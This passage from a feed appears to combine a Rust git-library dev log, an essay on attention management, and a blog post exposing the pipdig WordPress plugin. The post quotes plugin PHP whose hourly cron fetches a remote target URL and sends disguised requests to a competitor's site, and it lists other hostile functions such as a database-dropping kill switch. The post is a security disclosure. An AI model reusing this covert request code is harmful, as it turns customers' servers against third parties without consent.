&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;I've further confirmed that swapping out the packfile implementation for the older, slower packfile doesn't affect anything.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;I suspect&lt;/em&gt; this means there's either a problem in my delta code (highly possible!), my varint decoding code (&lt;em&gt;very&lt;/em&gt; possible), or the Read implementation for Deltas. Yay, narrowed down results!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2019-01-15 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;I added an (experimental) &lt;code&gt;git_rs::walk::tree&lt;/code&gt; iterator to take a Tree and yield a path + a blob for each item.
&lt;ul&gt;&lt;li&gt;It's probably slower than it should be: for each item it has to clone a &lt;code&gt;PathBuf&lt;/code&gt;, because I couldn't work out the lifetimes.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;If you know how to fix that&lt;/strong&gt;, please &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/issues/new?title=Here%27s%20how%20to%20remove%20the%20clone()%20from%20walk::tree&quot;&gt;open an issue&lt;/a&gt; and let me know 💞&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;I took some time to clean up the warnings during builds.
&lt;ul&gt;&lt;li&gt;Oh! I also installed &lt;a href=&quot;https://github.com/rust-lang/rust-clippy&quot;&gt;Clippy&lt;/a&gt; which warns about higher level antipatterns in Rust!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;I'm still noodling over the &lt;strong&gt;2-3x&lt;/strong&gt; slowdown between vanilla git and Our Git.
&lt;ul&gt;&lt;li&gt;I think I might create two packfile interfaces -- one &quot;generic&quot; and one &quot;mmap&quot;'d, to see if one or the other makes up the difference in performance.
&lt;ul&gt;&lt;li&gt;This also has the virtue of being &lt;code&gt;unsafe&lt;/code&gt; code, which is something I have not yet used in Rust!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2019-01-06 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;I wrote an iterator for commits! The &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/254d97e3d840eded4e5ff5a06b9414ff9396e976/src/walk/commits.rs#L56-L71&quot;&gt;first cut&lt;/a&gt; kept a &lt;code&gt;Vec&lt;/code&gt; of &lt;code&gt;(Id, Commit)&lt;/code&gt; around, so we could always pick the most recent &quot;next&quot; commit out of the graph (since commits may have many parents.)
&lt;ul&gt;&lt;li&gt;But in finishing up the collections section of &quot;Programming Rust&quot; I noticed that &lt;code&gt;BinaryHeap&lt;/code&gt; was available, which keeps entries in sorted order. You don't often get to choose the underlying storage mechanism of your collections in JS, so this hadn't occurred to me!&lt;/li&gt;
&lt;li&gt;Anyway. I swapped out the &lt;code&gt;Vec&lt;/code&gt; for a &lt;code&gt;BinaryHeap&lt;/code&gt; &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/commit/f8f4cf5f1430b14d3ef0b298ffa9f2cd880d5c28/src/walk/commits.rs#L40&quot;&gt;in this commit&lt;/a&gt;. Because this pushes the ordering into an &lt;code&gt;Ord&lt;/code&gt; impl for a type, this opens up the possibility of using the one iterator definition for multiple different orderings. Neat!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Testing against a couple long-lived repo, the results coming out of &lt;code&gt;git_rs&lt;/code&gt; are exactly the same as &lt;code&gt;git&lt;/code&gt;!
&lt;ul&gt;&lt;li&gt;However, it takes about &lt;strong&gt;twice&lt;/strong&gt; the time: &lt;strong&gt;60ms&lt;/strong&gt; for &lt;code&gt;git_rs&lt;/code&gt; where &lt;code&gt;git&lt;/code&gt; takes &lt;strong&gt;30ms&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;I think I have a lead on this, and it has to do with packfile stores: each read from a packfile opens a new &lt;code&gt;File&lt;/code&gt; instance.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;I've added a &lt;strong&gt;TODO&lt;/strong&gt; section to keep track of what comes next!&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2019-01-02 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;I implemented &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/commit/6157317fb18acac0633c624e9831282a950b4db0&quot;&gt;ref loading&lt;/a&gt;. It was a bit of a pain! Translating to and from &lt;code&gt;Path&lt;/code&gt; types took a bit of doing.&lt;/li&gt;
&lt;li&gt;I've been trying to read up on Rust idioms -- I found a couple of resources:
&lt;/li&gt;
&lt;li&gt;As a result, I've implemented &lt;code&gt;FromStr&lt;/code&gt; for &lt;code&gt;Id&lt;/code&gt;, (hopefully) giving it a more idiomatic API -- &lt;code&gt;let id: Id = str.parse()?&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2018-12-27 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Rust is feeling more natural. &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/fdbe4ac7c781a5c085777baafbd15655be2eca0b/src/objects/commit.rs#L20-L30&quot;&gt;This chain&lt;/a&gt; felt natural to write. I was even able to &lt;a href=&quot;https://github.com/chrisdickinson/git-rs/blob/fdbe4ac7c781a5c085777baafbd15655be2eca0b/src/packindex.rs#L116-L126&quot;&gt;cross-index a list&lt;/a&gt; with only a minimum of fighting the borrow checker.&lt;/li&gt;
&lt;li&gt;I split the objects interface into Type + boxed read with a method for reifying the data into an Object. This feels good! It lets folks check to see, for example, if they're referring to a Blob without having to load the entire Blob into memory.&lt;/li&gt;
&lt;li&gt;The closure interface for the loose interface works pretty well, but pack interfaces need to be able to ask the overarching set of stores for a reference due to REF_DELTA objects. This is a bummer, because it really quickly turns into &quot;fighting the borrow checker.&quot; Right now I think the way forward is to build a StorageSet that holds a Vec of heterogenous &lt;code&gt;Box&amp;lt;Storage&amp;gt;&lt;/code&gt; objects, where &lt;code&gt;Storage&lt;/code&gt; is a new trait that specifies &lt;code&gt;get(&amp;amp;Id, &amp;amp;StorageSet)&lt;/code&gt;.
&lt;ul&gt;&lt;li&gt;A sidenote re: the loose store: it feels kind of odd to have to produce a &lt;code&gt;git_rs::Error&lt;/code&gt; instead of a &lt;code&gt;std::io::Error&lt;/code&gt;. Room for improvement!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Oh! It was pretty easy to add a binary to this lib crate. And now we can &lt;code&gt;git log&lt;/code&gt; other repos!&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h3&gt;2018-12-21 Update&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Decided to focus on moving a bit slower and making sure I have tests for primitives this time around.&lt;/li&gt;
&lt;li&gt;Moved away from my original &lt;code&gt;Box&amp;lt;Write&amp;gt;&lt;/code&gt; trait object design for object instance reading &amp;amp; storage format in favor of generics.&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;/article&gt;&lt;/div&gt;

<description>&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;A few years ago during a break in a leadership class I was teaching, a manager named Michael walked up looking unsettled. His boss had told him he needed to be more productive, so he had spent a few hours analyzing how he spent his time. He had already cut his nonessential meetings. He couldn’t find any tasks to drop from his calendar. He didn’t see an obvious way to do them more efficiently.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;“This is going to sound like a joke, but it’s not,” he confessed. “My only idea is to drink less water so I don’t have to go to the bathroom so many times.”&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;We live in a culture obsessed with personal productivity. We devour books on getting things done and dream of four-hour workweeks. We &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2019/01/26/business/against-hustle-culture-rise-and-grind-tgim.html?module=inline&quot; title=&quot;&quot;&gt;worship at the altar of hustle&lt;/a&gt; and &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.linkedin.com/pulse/when-people-ask-you-how-stop-saying-busy-robert-glazer/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;boast about being busy&lt;/a&gt;. The key to getting things done, we’re often told, is &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.theguardian.com/technology/2016/dec/22/why-time-management-is-ruining-our-lives&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;time management&lt;/a&gt;. If you could just plan your schedule better, you could reach productivity nirvana.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;But after two decades of studying productivity, I’ve become convinced that time management is not a solution — it’s actually part of the problem.&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;For most of my career, the most frequent question I’ve gotten is: “How do I get more done?” Sometimes people ask because they know I’m an organizational psychologist, and productivity is one of my areas of expertise. More often they’re asking because they’ve read in a &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2013/03/31/magazine/is-giving-the-secret-to-getting-ahead.html?module=inline&quot; title=&quot;&quot;&gt;New York Times&lt;/a&gt; article or a &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://knowledge.wharton.upenn.edu/article/deep-work-the-secret-to-achieving-peak-productivity/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;popular book&lt;/a&gt; that I get a lot done.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;But the truth is that I don’t feel very productive. I’m constantly falling short of my daily goals for progress, so I’ve struggled to answer the question. It wasn’t until that conversation with Michael that it dawned on me: Being prolific is not about time management. There are a limited number of hours in the day, and focusing on time management just makes us more aware of how many of those hours we waste.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;A better option is attention management: Prioritize the people and projects that matter, and it won’t matter how long anything takes.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Attention management is the art of focusing on getting things done for the right reasons, in the right places and at the right moments.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;&lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;[Like what you’re reading?&lt;/em&gt; &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/newsletters/smarter-living?module=inline&quot; title=&quot;&quot;&gt;&lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;Sign up here&lt;/em&gt;&lt;/a&gt; &lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;for the Smarter Living newsletter to get stories like this (and much more!) delivered straight to your inbox every Monday morning.]&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;h2 class=&quot;css-sbs9ef eoo0vm40&quot; id=&quot;link-3af6d647&quot;&gt;O.K., sure, but why shift our focus?&lt;/h2&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;According to conventional wisdom about time management, you’re supposed to set goals for when you want to finish a task. I decided to try it for this article. The target was 1,200 words, so I sat down at 8 a.m. and gave myself three hours, which would allow me to write at the leisurely pace of six words per minute. I then spent the next six minutes writing a grand total of zero words, staring at a flashing cursor. The only task I completed was a Google search of whether the cursor was named in honor of all the writers who have cursed it. (Yes, I know you’re mocking me, you poor blinking excuse for a rectangle.) Then I wondered how many words I actually type per minute and took a typing test. I wasn’t happy with my score, so I took another … and another.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Eventually I got frustrated and shifted to attention management. E.B. White once &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://archive.nytimes.com/www.nytimes.com/books/97/08/03/lifetimes/white-notes.html?module=inline&quot; title=&quot;&quot;&gt;wrote&lt;/a&gt;: “I arise in the morning torn between a desire to improve (or save) the world and a desire to enjoy (or savor) the world. This makes it hard to plan the day.” But in my &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.adamgrant.net/give-and-take&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;research&lt;/a&gt;, I’ve found that productive people don’t agonize about which desire to pursue. They go after both simultaneously, gravitating toward projects that are personally interesting and socially meaningful.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;So instead of focusing on how quickly I wanted to finish this article, I asked why I agreed to write it in the first place: I might learn something new when synthesizing the research; I’d finally have somewhere to point people when they ask about productivity; and it might help some of those people. That led me to start thinking about specific people who might read this, which reminded me of Michael. Boom.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Often our productivity struggles are caused not by a lack of efficiency, but a lack of motivation. Productivity isn’t a virtue. It’s a means to an end. It’s only virtuous if the end is worthy. If productivity is your goal, you have to rely on willpower to push yourself to get a task done. If you pay attention to why you’re excited about the project and who will benefit from it, you’ll be naturally pulled into it by intrinsic motivation.&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;

&lt;span class=&quot;css-8i9d0s e13ogyst0&quot;&gt;Erik Winkowski&lt;/span&gt;&lt;span class=&quot;css-cch8ym&quot;&gt;&lt;span class=&quot;css-1dv1kvn&quot;&gt;Credit&lt;/span&gt;&lt;/span&gt;
&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;h2 class=&quot;css-sbs9ef eoo0vm40&quot; id=&quot;link-5613bb6e&quot;&gt;But how do I stay on task if I’m not worried about time?&lt;/h2&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Attention management also involves noticing where you get things done. I grew up in Michigan, and when I went back there for grad school, I tried to convince a friend from the West Coast to join me.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;“It’s too cold and gray,” she said after a visit during a snowstorm. She then went off to Stanford. That next Michigan winter was the coldest, grayest season I could remember, and I have never been more productive. There was nothing to do but work!&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Sure enough, a &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://psycnet.apa.org/fulltext/2014-01192-001.html&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;series of studies&lt;/a&gt; led by Julia Lee (now at Michigan) show that bad weather is good for productivity because we’re less likely to be distracted by the thought of going outside. Researchers found that on days when it rained, Japanese bank employees finished transactions faster, and on days when the weather was bad in America, people were more efficient in correcting spelling errors in an essay. With that in mind, I deliberately waited to start writing this article until the day after a snowstorm, when the melting slush outside my window was not appealing.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;My favorite part of attention management is the &lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;when&lt;/em&gt;. Most of our productivity challenges are with tasks that we don’t want to do but that we need to do. For years, I thought the way to handle those tasks was to do them right after the most interesting tasks so the energy would spill over. Then my colleague Jihae Shin and I ran a &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://journals.aom.org/doi/abs/10.5465/amj.2017.0735&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;study&lt;/a&gt; in a Korean department store and found that when employees had a highly interesting task, they actually performed worse on their most boring tasks.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;One possible reason is what’s called &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.sciencedirect.com/science/article/pii/S0749597809000399&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;attention residue&lt;/a&gt;: Your mind keeps wandering back to the interesting task, disrupting your focus on the boring task. But in an experiment with Americans watching videos and then doing a dull data entry task, we found support for a different mechanism: contrast effects. A fascinating or funny video makes the data entry task seem even more excruciating, the same way a sweet dessert makes a sour vegetable taste yuckier. So if you’re trying to power through a boring task, do it after a moderately interesting one, and save your most exciting task as a reward for afterward. It’s not about time; it’s about timing.&lt;/p&gt;
&lt;h2 class=&quot;css-sbs9ef eoo0vm40&quot; id=&quot;link-32a09278&quot;&gt;Of makers and managers&lt;/h2&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;I’m guessing your goal is not just to be more productive — you probably want to be creative, too.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The stumbling block is that productivity and creativity demand opposite attention management strategies. Productivity is fueled by raising attentional filters to keep unrelated or distracting thoughts out. But creativity is fueled by lowering attentional filters to let those thoughts in.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;How do you get the best of both worlds? In his book “&lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.amazon.com/When-Scientific-Secrets-Perfect-Timing/dp/0735210624&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;When&lt;/a&gt;,” Dan Pink writes about evidence that your circadian rhythm can help you figure out the right time to do your productive and creative work. If you’re a morning person, you should do your analytical work early when you’re at peak alertness; your routine tasks around lunchtime in your trough; and your creative work in the late afternoon or evening when you’re more likely to do nonlinear thinking. If you’re more of a night owl, you might be better off flipping creative projects to your fuzzy mornings and analytical tasks to your clearest-eyed late afternoon and evening moments. It’s not time management, because you might spend the same amount of time on the tasks even after you rearrange your schedule. It’s attention management: You’re noticing the order of tasks that works for you and adjusting accordingly.&lt;/p&gt;

&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Paying attention to timing management also means thinking differently about how you plan your work. I love Paul Graham’s &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://www.paulgraham.com/makersschedule.html&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;suggestion&lt;/a&gt; to divide the week into “maker days” and “manager days.”&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;On manager days, you hold your meetings and calls. On maker days, you block out time to be productive and creative, knowing you’ll be free from distractions that would normally interrupt your &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.amazon.com/Finding-Flow-Psychology-Engagement-Masterminds/dp/0465024114&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;flow&lt;/a&gt;. Unfortunately, few of us have the luxury to manage every week that way, which means we need to find ways to carve out maker moments.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Time management says we should eliminate distractions altogether — not just &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.linkedin.com/pulse/when-work-takes-over-your-life-adam-grant/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;interruptions from other people&lt;/a&gt;, but also the times when we interrupt ourselves. If you’re getting sucked into social media, you’d need to stop cold turkey. Attention management offers an alternative: Be thoughtful about the timing of those distractions.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;When I was in middle school, I lost a whole Saturday to watching TV and I felt pretty disgusted with myself afterward. But I didn’t give up TV. I made a rule: I would only turn on the TV if I already knew what I wanted to watch. I’ve adopted the same policy on social media: In times when I could be working, I only log in to share content. I save scrolling for windows when I couldn’t be getting anything done, like waiting for a flight to take off or cooling down after exercise.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Most of the writers I know wait for maker days to start writing, believing they need at least four or six hours to dig into a big idea or a complex problem. But there’s &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://journals.sagepub.com/doi/abs/10.1177/0741088397014004001&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;evidence&lt;/a&gt; that binge writers actually get less done than people who write in shorter bursts. You can make meaningful progress in surprisingly small intervals: When graduate students were &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.amazon.com/Professors-Writers-Self-Help-Productive-Writing/dp/091350713X/ref=sr_1_fkmrnull_1?keywords=boice+professors+as+writers&amp;amp;qid=1550762723&amp;amp;s=gateway&amp;amp;sr=8-1-fkmrnull&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;trained&lt;/a&gt; to write in 15-minute intervals, they finished their dissertations faster.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;If you’re trying to be more productive, don’t analyze how you spend your time. Pay attention to what consumes your attention. I’ve just looked at the clock for the first time since I thought of the story about Michael. It’s 10:36 a.m., and I’ve gone about 500 words over my target. I’ll leave it to you to decide whether the past 156 minutes were a good use of my attention — and whether the past few minutes of reading this were a good use of yours.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Which brings me to one more thought: I’m pretty sure there’s an eighth habit of highly effective people. They don’t spend all their time reading about the seven habits of highly effective people.&lt;/p&gt;
&lt;/div&gt;

<title>WordPress theme provider Pipdig using customer sites to DDoS competitors</title>
<link>https://www.jemjabella.co.uk/2019/security-alert-pipdig-insecure-ddosing-competitors/</link>
<guid isPermaLink="true" >https://www.jemjabella.co.uk/2019/security-alert-pipdig-insecure-ddosing-competitors/</guid>
<description>&lt;p&gt;I love WordPress. I make my living from it. It’s no exaggeration to say that developing WordPress websites has changed my life: it provides me with an income that pays my mortgage and feeds my babies. However, every now and again something happens in the WordPress community that gets my back up, and this week is no exception.&lt;/p&gt;
&lt;p&gt;An unnamed client approached me this week complaining that her website, which was running a theme she’d purchased from a WordPress theme provider, was behaving oddly. Amongst other things, it was getting slower for no obvious reason. As speed is an important ranking factor for search engines (not to mention crucial for retaining visitors) I said I’d do some digging. What I discovered absolutely blew me away; I’ve never seen anything like it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;pipdig&lt;/strong&gt;, one of the biggest WordPress theme providers to bloggers, is distributing code dressed up as the “pipdig Power Pack” plugin which amongst other things:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;is using other blogger’s servers to perform a DDoS on a competitor&lt;/li&gt;
&lt;li&gt;is manipulating blogger’s content to change links to competitor WordPress migration services to point to the pipdig site&lt;/li&gt;
&lt;li&gt;is harvesting data from blogger’s sites without permission, directly contravening various parts of the GDPR&lt;/li&gt;
&lt;li&gt;is using the harvested data to, amongst other things, gain access to blogger’s sites by changing admin passwords&lt;/li&gt;
&lt;li&gt;contains a ‘kill switch’ which drops all database tables&lt;/li&gt;
&lt;li&gt;deliberately disables other plugins that pipdig has decided are unnecessary, without asking permission&lt;/li&gt;
&lt;li&gt;hides admin notices and meta boxes from WordPress core and other plugins from the dashboard, which could contain vital information&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Let’s break this down bit by bit.&lt;/p&gt;
&lt;h2&gt;pipdig p3 plugin performing a DDoS on a competitor&lt;/h2&gt;
&lt;p&gt;In /p3/inc/cron.php we have the following block of code nested in a function which WP Cron runs every single hour:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// Check CDN cache
$url_3 = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
$response = wp_safe_remote_get($url_3, $args);
if (!is_wp_error($response) &amp;amp;&amp;amp; !empty($response['body'])) {
        $rcd = trim($response['body']);
        $args = array('timeout' =&amp;gt; 10, 'user-agent' =&amp;gt; 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' =&amp;gt; true, 'blocking' =&amp;gt; false, 'sslverify' =&amp;gt; false);
        //$check = add_query_arg('n', rand(0,99999), $rcd);
        wp_safe_remote_get($rcd.'&amp;amp;'.rand(0,99999), $args);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The code comment tells us this is “checking the CDN (content delivery network) cache”. It’s not. This is performing a GET request on a file (id39dqm3c0_license_h.txt) sat on pipdigz.co.uk, which yesterday morning returned ‘https://kotrynabassdesign.com/wp-admin/admin-ajax.php’ in the response body.&lt;/p&gt;
&lt;p&gt;When the response body is not empty, i.e. when it contains that URL, the following code sends a second GET request to the admin-ajax.php URL from the response, with a faked user agent:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$rcd = trim($response['body']);
$args = array('timeout' =&amp;gt; 10, 'user-agent' =&amp;gt; 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' =&amp;gt; true, 'blocking' =&amp;gt; false, 'sslverify' =&amp;gt; false);
wp_safe_remote_get($rcd.'&amp;amp;'.rand(0,99999), $args);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;So, every single hour night and day, without any manual intervention, any blogger running the pipdig plugin will send a request with a faked User Agent to ‘https://kotrynabassdesign.com/wp-admin/admin-ajax.php’ with a random number string attached. This is effectively performing a small scale DDoS (Distributed Denial of Service) on kotrynabassdesign.com’s server.&lt;/p&gt;
&lt;p&gt;I spoke to Kotryna about these requests to rule out some sort of mutual arrangement with pipdig, and she said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I actually had huge trouble with my web host and they explained that my admin-ajax.php file was under some kind of attack [..] I can confirm that I have never given pipdig any permissions to make requests to my servers. Nor was I ever in a partnership or any sort of contact with them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Further, Kotryna provided me with conversations she had with her host:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log1.png&quot; alt=&quot;&quot; class=&quot;aligncenter size-full wp-image-4517&quot; srcset=&quot;https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log1.png 910w, https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log1-586x650.png 586w, https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log1-768x852.png 768w&quot; sizes=&quot;(max-width: 910px) 100vw, 910px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log2.png&quot; alt=&quot;&quot; class=&quot;aligncenter size-full wp-image-4518&quot; srcset=&quot;https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log2.png 912w, https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log2-500x650.png 500w, https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log2-768x999.png 768w, https://www.jemjabella.co.uk/wp-content/uploads/2019/03/kotryna_bass_host_conversation_log2-787x1024.png 787w&quot; sizes=&quot;(max-width: 912px) 100vw, 912px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Note the quotes from her server log file, in particular the exact User Agent string recorded in the pipdig plugin (‘Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36’) and the request to admin-ajax.php using a random numbered query string exactly as per the request PHP.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Clarification 2019-03-29 20:00 GMT: Kotryna is the &lt;u&gt;victim&lt;/u&gt; of the DDoS-like attack. She is in no way implicated as a co-conspirator in this and has been incredibly helpful in dealing with my enquiries.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The only exception to this DDoSing is for customers of pipdig’s own hosting – because the hourly cron runs this check first:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;if (function_exists('pipdighost_admin_footer')) {
        return;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;…presumably so as not to slow down the pipdig server(s) and to prevent any finger being pointed at customers of theirs.&lt;/p&gt;
&lt;p&gt;There is also a second request identical to this in the Once Daily cron, although I’ve not been able to get it to return a URL in the body yet:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license.txt';
$response = wp_safe_remote_get($url, $args);
if (!is_wp_error($response) &amp;amp;&amp;amp; !empty($response['body'])) {
        $rcd = trim($response['body']);
        //$check = add_query_arg('n', rand(0,99999), $rcd);
